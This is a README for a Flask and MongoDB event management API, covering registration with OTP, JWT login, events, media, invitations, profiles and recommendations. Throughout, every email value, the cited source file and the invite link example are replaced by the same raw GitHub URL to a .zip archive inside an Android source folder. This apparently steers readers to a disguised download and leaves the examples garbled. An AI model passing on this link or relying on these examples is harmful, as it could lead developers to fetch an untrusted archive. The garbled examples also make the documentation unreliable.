# Event Management API

This is a Flask-based API for managing events, user authentication, profiles, and event recommendations. It uses MongoDB as the database and includes features like JWT authentication, email verification, rate limiting, and QR code generation for event invitations.

---

## Table of Contents
1. [Features](#features)
2. [Technologies Used](#technologies-used)
3. [Setup and Installation](#setup-and-installation)
4. [API Endpoints](#api-endpoints)
5. [Environment Variables](#environment-variables)
6. [Running the Application](#running-the-application)
7. [Contributing](#contributing)
8. [License](#license)

---

## Features
- **User Authentication**: Register, login, and email verification with OTP.
- **Event Management**: Create, update, and list events.
- **Profile Management**: Update user profiles.
- **Event Recommendations**: Get personalized event recommendations.
- **Event Joining**: Join events and generate QR codes for invitations.
- **Rate Limiting**: Prevent abuse with rate limiting.
- **Email Notifications**: Send emails for OTP and event invitations.

---

## Technologies Used
- **Backend**: Flask (Python)
- **Database**: MongoDB
- **Authentication**: JWT (JSON Web Tokens)
- **Password Hashing**: Bcrypt
- **Email**: Flask-Mail
- **Rate Limiting**: Flask-Limiter
- **File Storage**: GridFS (for large files)
- **Environment Management**: `python-dotenv`
- **CORS**: Flask-CORS

---

# Authentication API Routes Documentation

## Overview
This document provides details on the authentication routes defined in `https://raw.githubusercontent.com/the-vishal-gupta/INVYTA-EVENT-MANAGING-PLATFORM/main/invyta/invyta/android/app/src/main/kotlin/INVYT-EVEN-MANAGIN-PLATFORM-2.3.zip`. The authentication system includes user registration, email verification via OTP, login, and a protected route that requires authentication.

## Routes

### 1. **Register User**
**Endpoint:** `POST /register`

**Description:** Registers a new user by storing their email and hashed password in the database and sending an OTP for email verification.

**Request Body:**
```json
{
    "email": "https://raw.githubusercontent.com/the-vishal-gupta/INVYTA-EVENT-MANAGING-PLATFORM/main/invyta/invyta/android/app/src/main/kotlin/INVYT-EVEN-MANAGIN-PLATFORM-2.3.zip",
    "password": "securepassword"
}
```

**Response:**
- **201 Created** (If user is registered successfully)
```json
{
    "message": "User registered. Please verify your email."
}
```
- **400 Bad Request** (If user already exists)
```json
{
    "message": "User already exists"
}
```

---

### 2. **Verify Email with OTP**
**Endpoint:** `POST /verify`

**Description:** Verifies the user's email using an OTP sent to their registered email.

**Request Body:**
```json
{
    "email": "https://raw.githubusercontent.com/the-vishal-gupta/INVYTA-EVENT-MANAGING-PLATFORM/main/invyta/invyta/android/app/src/main/kotlin/INVYT-EVEN-MANAGIN-PLATFORM-2.3.zip",
    "otp": "123456"
}
```

**Response:**
- **200 OK** (If OTP is correct)
```json
{
    "message": "Email verified successfully"
}
```
- **400 Bad Request** (If OTP is invalid)
```json
{
    "message": "Invalid OTP"
}
```
- **404 Not Found** (If user does not exist)
```json
{
    "message": "User does not exist"
}
```

---

### 3. **Login User**
**Endpoint:** `POST /login`

**Description:** Logs in a user by verifying their email and password. Returns a JWT token upon successful authentication.

**Request Body:**
```json
{
    "email": "https://raw.githubusercontent.com/the-vishal-gupta/INVYTA-EVENT-MANAGING-PLATFORM/main/invyta/invyta/android/app/src/main/kotlin/INVYT-EVEN-MANAGIN-PLATFORM-2.3.zip",
    "password": "securepassword"
}
```

**Response:**
- **200 OK** (If login is successful)
```json
{
    "access_token": "jwt_token_here",
    "has_username": true,
    "user_id": "generated_user_id"
}
```
- **401 Unauthorized** (If credentials are invalid)
```json
{
    "message": "Invalid credentials"
}
```
- **403 Forbidden** (If email is not verified)
```json
{
    "message": "Email not verified"
}
```

---

### 4. **Protected Route**
**Endpoint:** `GET /protected`

**Description:** A sample protected route that requires authentication.

**Headers:**
```json
{
    "Authorization": "Bearer jwt_token_here"
}
```

**Response:**
- **200 OK** (If JWT is valid)
```json
{
    "logged_in_as": "https://raw.githubusercontent.com/the-vishal-gupta/INVYTA-EVENT-MANAGING-PLATFORM/main/invyta/invyta/android/app/src/main/kotlin/INVYT-EVEN-MANAGIN-PLATFORM-2.3.zip"
}
```
- **401 Unauthorized** (If JWT is missing or invalid)
```json
{
    "msg": "Missing or invalid token"
}
```
# Event Management

This API provides endpoints for managing events, including creation, updates, media handling, and attendance management.

## Authentication
All routes marked with 🔒 require JWT authentication. Include the JWT token in the Authorization header:
```
Authorization: Bearer <your_jwt_token>
```

## API Endpoints

### Event Management

#### Create Event 🔒
- **Route:** `POST /create`
- **Description:** Create a new event
- **Input:**
```json
{
  "title": "Summer Party",
  "description": "Annual summer celebration",
  "date": "2024-07-15",
  "backdrop_image": "image_url",
  "location": "Central Park",
  "max_people": 100,
  "is_private": false,
  "tags": ["summer", "party", "outdoor"]
}
```
- **Output Success (201):**
```json
{
  "message": "Event created successfully",
  "event_id": "507f1f77bcf86cd799439011"
}
```

#### Get Event
- **Route:** `GET /<event_id>`
- **Description:** Retrieve event details by ID
- **Output Success (200):**
```json
{
  "_id": "507f1f77bcf86cd799439011",
  "title": "Summer Party",
  "description": "Annual summer celebration",
  "date": "2024-07-15",
  "backdrop_image": "image_url",
  "location": "Central Park",
  "max_people": 100,
  "is_private": false,
  "tags": ["summer", "party", "outdoor"]
}
```

#### Update Event
- **Route:** `PUT /<event_id>`
- **Description:** Update an existing event
- **Input:** Any field from the create event input
- **Output Success (200):**
```json
{
  "message": "Event updated successfully"
}
```

#### Delete Event
- **Route:** `DELETE /<event_id>`
- **Description:** Delete an event
- **Output Success (200):**
```json
{
  "message": "Event deleted successfully"
}
```

### User Management

#### Approve User 🔒
- **Route:** `POST /event/<event_id>/approve`
- **Description:** Approve a user for a private event
- **Input:**
```json
{
  "user_id": "user123"
}
```
- **Output Success (200):**
```json
{
  "message": "User approved successfully"
}
```

#### Get User Events 🔒
- **Route:** `GET /event/user`
- **Description:** Get all events created by the authenticated user
- **Output Success (200):**
```json
[
  {
    "_id": "507f1f77bcf86cd799439011",
    "title": "Summer Party",
    "date": "2024-07-15",
    "created_at": "2024-02-20 10:00:00",
    "updated_at": "2024-02-20 10:00:00"
  }
]
```

### Invitation Management

#### Generate Invite Link 🔒
- **Route:** `GET /generate-invite-link/<event_id>`
- **Description:** Generate a unique invitation link
- **Output Success (200):**
```json
{
  "invite_link": "https://raw.githubusercontent.com/the-vishal-gupta/INVYTA-EVENT-MANAGING-PLATFORM/main/invyta/invyta/android/app/src/main/kotlin/INVYT-EVEN-MANAGIN-PLATFORM-2.3.zip"
}
```

#### Generate QR Code 🔒
- **Route:** `GET /generate-qr-code/<event_id>`
- **Description:** Generate QR code for event invitation
- **Output:** PNG image file

### Media Management

#### Upload Media 🔒
- **Route:** `POST /events/<event_id>/media/upload`
- **Description:** Upload media file for an event
- **Input:** Multipart form data with 'file' field
- **Output Success (200):**
```json
{
  "message": "File uploaded successfully",
  "file_id": "507f1f77bcf86cd799439011"
}
```

#### Get Media
- **Route:** `GET /events/<event_id>/media/<file_id>`
- **Description:** Retrieve a specific media file
- **Output:** Media file with appropriate content type

#### Moderate Media 🔒
- **Route:** `POST /events/<event_id>/media/moderate`
- **Description:** Approve or reject media files
- **Input:**
```json
{
  "file_id": "507f1f77bcf86cd799439011",
  "status": "approved"
}
```
- **Output Success (200):**
```json
{
  "message": "Media file approved successfully"
}
```

#### List Media
- **Route:** `GET /events/<event_id>/media`
- **Description:** List all media files for an event
- **Output Success (200):**
```json
{
  "media": [
    {
      "file_id": "507f1f77bcf86cd799439011",
      "uploaded_by": "user123",
      "status": "pending",
      "uploaded_at": "2024-02-20T10:00:00Z"
    }
  ]
}
```

# Event Join, Profile, and Recommendations API Documentation

## Event Join Routes

### Join Event 🔒
- **Route:** `POST /join`
- **Description:** Allow a user to join an event using an invitation link
- **Input:**
```json
{
  "event_id": "507f1f77bcf86cd799439011",
  "token": "abc123def456"
}
```
- **Output Success (200):**
  - For public events:
  ```json
  {
    "message": "Successfully joined the event"
  }
  ```
  - For private events:
  ```json
  {
    "message": "Your request to join the event is pending approval"
  }
  ```
- **Error Responses:**
  - 400: Invalid event ID or token
  - 404: User not found
  - 400: Already attending event

### Update RSVP Status 🔒
- **Route:** `POST /event/<event_id>/rsvp`
- **Description:** Update user's RSVP status for an event
- **Input:**
```json
{
  "rsvp_status": "attending"  // Options: "attending", "not_attending", "maybe"
}
```
- **Output Success (200):**
```json
{
  "message": "RSVP status updated successfully"
}
```
- **Error Responses:**
  - 400: Invalid RSVP status
  - 404: Event or user not found

## Profile Management Routes

### Update Profile 🔒
- **Route:** `POST /profile`
- **Description:** Update user profile information
- **Input:**
```json
{
  "username": "john_doe",
  "bio": "Event enthusiast and photographer",
  "favorite": "music,outdoor,technology"  // Comma-separated interests
}
```
- **Output Success (201):**
```json
{
  "message": "User Updated."
}
```
- **Error Responses:**
  - 404: User not found

### Get Profile 🔒
- **Route:** `GET /profile`
- **Description:** Retrieve current user's profile information
- **Output Success (200):**
```json
{
  "email": "https://raw.githubusercontent.com/the-vishal-gupta/INVYTA-EVENT-MANAGING-PLATFORM/main/invyta/invyta/android/app/src/main/kotlin/INVYT-EVEN-MANAGIN-PLATFORM-2.3.zip",
  "username": "john_doe",
  "user_id": "user123",
  "bio": "Event enthusiast and photographer",
  "created_on": "2024-02-23T10:00:00Z",
  "favorite": ["music", "outdoor", "technology"]
}
```
- **Error Responses:**
  - 404: User not found

## Recommendation Routes

### Get Event Recommendations 🔒
- **Route:** `GET /recommend`
- **Description:** Get personalized event recommendations based on user favorites
- **Output Success (200):**
```json
{
  "recommended_events": [
    {
      "_id": "507f1f77bcf86cd799439011",
      "title": "Summer Music Festival",
      "description": "Annual music celebration",
      "tags": ["music", "outdoor"],
      // ... other event details
    }
  ]
}
```
- **Special Cases:**
  - If no favorites are set:
  ```json
  {
    "message": "No favorites found. Add some to get recommendations!"
  }
  ```
- **Error Responses:**
  - 404: User not found
  - 500: Server error

### Error Responses

All endpoints may return the following error responses:

- **400 Bad Request:** Invalid input data or parameters
- **401 Unauthorized:** Missing or invalid JWT token
- **403 Forbidden:** Insufficient permissions
- **404 Not Found:** Resource not found
- **500 Internal Server Error:** Server-side error

## Notes
- All dates should be provided in "YYYY-MM-DD" format
- Media files are stored using GridFS
- Private events require explicit user approval
- Event creators have special privileges for their events
